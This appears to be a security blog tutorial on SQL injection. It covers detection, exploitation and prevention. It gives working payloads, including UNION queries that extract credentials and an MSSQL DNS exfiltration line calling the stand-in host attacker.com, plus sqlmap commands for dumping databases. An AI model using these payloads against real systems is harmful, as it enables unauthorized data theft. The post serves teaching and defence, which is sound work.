---
layout: post
title: "SQL Injection: A Complete Guide to Detection and Exploitation"
date: 2024-01-15 10:00:00 -0000
categories: [Web Security, Penetration Testing]
tags: [SQL Injection, OWASP, Web Security, Exploitation]
author: Your Name
---

SQL Injection remains one of the most critical web application vulnerabilities, consistently appearing in the OWASP Top 10. In this comprehensive guide, we'll explore SQL injection from both offensive and defensive perspectives.

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's database layer. Attackers can manipulate SQL queries by injecting malicious input, potentially leading to:

- Unauthorized data access
- Data modification or deletion
- Authentication bypass
- Remote code execution (in some cases)

## Types of SQL Injection

### 1. Error-Based SQL Injection

The application returns database errors that reveal information about the database structure.

```sql
# Vulnerable query
SELECT * FROM users WHERE id = '1' OR '1'='1'

# Payload
1' OR '1'='1
```

### 2. Union-Based SQL Injection

Leverages the UNION SQL operator to combine results from injected queries.

```sql
# Determining number of columns
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--

# Extracting data
1' UNION SELECT null, username, password FROM admin--
```

### 3. Blind SQL Injection

The application doesn't return errors but behavior changes based on the query result.

#### Boolean-Based Blind SQLi
```sql
# True condition
1' AND '1'='1

# False condition
1' AND '1'='2
```

#### Time-Based Blind SQLi
```sql
# MySQL
1' AND SLEEP(5)--

# PostgreSQL
1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

# MSSQL
1'; WAITFOR DELAY '00:00:05'--
```

### 4. Out-of-Band SQL Injection

Data is exfiltrated using different channels (DNS, HTTP).

```sql
# DNS exfiltration (MSSQL)
'; EXEC master..xp_dirtree '\\'+@@version+'.attacker.com\share'--
```

## Detection Techniques

### Manual Testing

1. **Single Quote Test**
```
Input: admin'
Expected: SQL error or unusual behavior
```

2. **Logic Test**
```
Username: admin' OR '1'='1
Password: anything
```

3. **Time Delay Test**
```
Input: 1' AND SLEEP(5)--
Expected: 5-second delay
```

### Automated Tools

- **SQLMap**: Industry standard for automated SQL injection
- **Burp Suite**: Professional web security testing
- **OWASP ZAP**: Free alternative to Burp Suite

## Exploitation Example

Let's walk through a real-world scenario:

```python
# Vulnerable PHP code
$id = $_GET['id'];
$query = "SELECT * FROM products WHERE id = '$id'";
$result = mysqli_query($conn, $query);
```

### Step 1: Identify Vulnerability
```
http://target.com/product.php?id=1'

# Error message reveals vulnerability
```

### Step 2: Determine Column Count
```
http://target.com/product.php?id=1' ORDER BY 5--

# Keep increasing until error occurs
```

### Step 3: Find Injectable Columns
```
http://target.com/product.php?id=-1' UNION SELECT 1,2,3,4,5--

# Note which numbers appear on the page
```

### Step 4: Extract Database Information
```
# Get database version
http://target.com/product.php?id=-1' UNION SELECT 1,@@version,3,4,5--

# Get current database
http://target.com/product.php?id=-1' UNION SELECT 1,database(),3,4,5--

# List tables
http://target.com/product.php?id=-1' UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()--
```

### Step 5: Extract Sensitive Data
```
# Get column names
http://target.com/product.php?id=-1' UNION SELECT 1,column_name,3,4,5 FROM information_schema.columns WHERE table_name='users'--

# Extract user credentials
http://target.com/product.php?id=-1' UNION SELECT 1,username,password,4,5 FROM users--
```

## Using SQLMap

```bash
# Basic scan
sqlmap -u "http://target.com/product.php?id=1"

# Enumerate databases
sqlmap -u "http://target.com/product.php?id=1" --dbs

# Dump specific database
sqlmap -u "http://target.com/product.php?id=1" -D database_name --dump

# With authentication
sqlmap -u "http://target.com/product.php?id=1" --cookie="PHPSESSID=abc123"

# POST request
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass"
```

## Prevention & Mitigation

### 1. Parameterized Queries (Prepared Statements)

**PHP (PDO)**
```php
$stmt = $pdo->prepare('SELECT * FROM products WHERE id = ?');
$stmt->execute([$id]);
```

**Python**
```python
cursor.execute("SELECT * FROM products WHERE id = %s", (id,))
```

**Node.js**
```javascript
db.query('SELECT * FROM products WHERE id = ?', [id], callback);
```

### 2. Input Validation

```javascript
// Whitelist validation
const validId = /^[0-9]+$/;
if (!validId.test(userId)) {
    throw new Error('Invalid ID format');
}

// Type casting
const id = parseInt(req.params.id);
if (isNaN(id)) {
    throw new Error('ID must be a number');
}
```

### 3. Least Privilege Principle

```sql
-- Create limited user for application
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'webapp'@'localhost';

-- Don't grant DROP, CREATE, or administrative privileges
```

### 4. Web Application Firewall (WAF)

- ModSecurity rules
- Cloudflare WAF
- AWS WAF
- Azure WAF

### 5. Stored Procedures (with caution)

```sql
-- Still vulnerable if not used correctly
CREATE PROCEDURE GetUser(IN userId INT)
BEGIN
    SELECT * FROM users WHERE id = userId;
END;
```

## Testing Checklist

- [ ] Test all input fields (GET, POST, headers, cookies)
- [ ] Test numeric and string parameters
- [ ] Check for error messages
- [ ] Test with special characters: `' " ; -- /* */ @@`
- [ ] Attempt time-based injections
- [ ] Try different DBMS syntax (MySQL, PostgreSQL, MSSQL, Oracle)
- [ ] Test second-order SQL injection
- [ ] Check for NoSQL injection in modern applications

## Real-World Impact

**Case Study: TalkTalk (2015)**
- SQL injection vulnerability exploited
- 157,000 customer records stolen
- £400,000 fine from UK authorities
- Massive reputational damage

## Resources

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap)
- [PentestMonkey SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)

## Conclusion

SQL injection remains a critical threat due to:
- Legacy applications
- Insufficient input validation
- Dynamic query construction
- Lack of security awareness

Understanding both exploitation and prevention is crucial for building secure applications. Always follow secure coding practices and regularly test your applications for vulnerabilities.

**Remember**: Only test on systems you own or have explicit permission to test. Unauthorized testing is illegal.

---

*Have questions or found this helpful? Connect with me on [Twitter](https://twitter.com/your-username) or [LinkedIn](https://linkedin.com/in/your-username).*
